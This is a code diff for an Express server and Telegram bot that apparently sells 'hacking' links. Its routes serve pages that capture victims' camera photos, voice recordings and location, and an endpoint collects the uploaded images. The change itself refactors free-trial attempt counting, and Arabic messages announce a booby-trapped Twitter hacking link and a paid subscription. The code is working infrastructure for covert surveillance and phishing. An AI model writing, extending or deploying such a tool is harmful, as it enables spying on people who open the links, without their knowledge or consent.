@@ -17,6 +17,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.static(path.join(__dirname, 'src')));
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
+
 const MAX_FREE_ATTEMPTS = 10;
 const userVisits = {};
 const freeTrialEndedMessage = 'لقد انتهت الفترة التجريبية المجانية. الرجاء شراء اشتراك من المطور لاستخدام البوت بدون قيود.';
@@ -24,6 +25,17 @@ const freeTrialEndedMessage = 'لقد انتهت الفترة التجريبية
 const adminId = '7130416076';
 const subscribedUsers = new Set();
 
+const trackAttempts = (userId, action) => {
+    if (!userVisits[userId]) {
+        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0, platform: 0 };
+    }
+
+    userVisits[userId][action]++;
+
+    return userVisits[userId][action] > MAX_FREE_ATTEMPTS;
+};
+
+// المسار الأصلي
 app.get('/:platform/:chatId', (req, res) => {
     const { platform, chatId } = req.params;
 
@@ -32,13 +44,7 @@ app.get('/:platform/:chatId', (req, res) => {
         return;
     }
 
-    if (!userVisits[chatId]) {
-        userVisits[chatId] = { camera: 0, voiceRecord: 0, getLocation: 0, platform: 0 };
-    }
-
-    userVisits[chatId].platform++;
-
-    if (userVisits[chatId].platform > MAX_FREE_ATTEMPTS) {
+    if (trackAttempts(chatId, 'platform')) {
         res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
         return;
     }
@@ -56,13 +62,7 @@ app.get('/camera/:userId', (req, res) => {
         return;
     }
 
-    if (!userVisits[userId]) {
-        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
-    }
-
-    userVisits[userId].camera++;
-
-    if (userVisits[userId].camera > MAX_FREE_ATTEMPTS) {
+    if (trackAttempts(userId, 'camera')) {
         res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
         return;
     }
@@ -80,13 +80,7 @@ app.get('/record/:userId', (req, res) => {
         return;
     }
 
-    if (!userVisits[userId]) {
-        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
-    }
-
-    userVisits[userId].voiceRecord++;
-
-    if (userVisits[userId].voiceRecord > MAX_FREE_ATTEMPTS) {
+    if (trackAttempts(userId, 'voiceRecord')) {
         res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
         return;
     }
@@ -103,19 +97,15 @@ app.get('/getLocation/:userId', (req, res) => {
         return;
     }
 
-    if (!userVisits[userId]) {
-        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
-    }
-
-    userVisits[userId].getLocation++;
-
-    if (userVisits[userId].getLocation > MAX_FREE_ATTEMPTS) {
+    if (trackAttempts(userId, 'getLocation')) {
         res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
         return;
     }
 
     res.sendFile(path.join(__dirname, 'SJGD.html'));
 });
+
+
 
 // استلام الصور
 app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
@@ -382,8 +372,6 @@ bot.on('callback_query', (query) => {
             url = `${baseUrl}/twitter/${chatId}`;
             bot.sendMessage(chatId, `تم تلغيم رابط اختراق التويتر: ${url}`);
             break;
-        default:
-            bot.sendMessage(chatId, 'أمر غير معروف.');
     }
 });
 
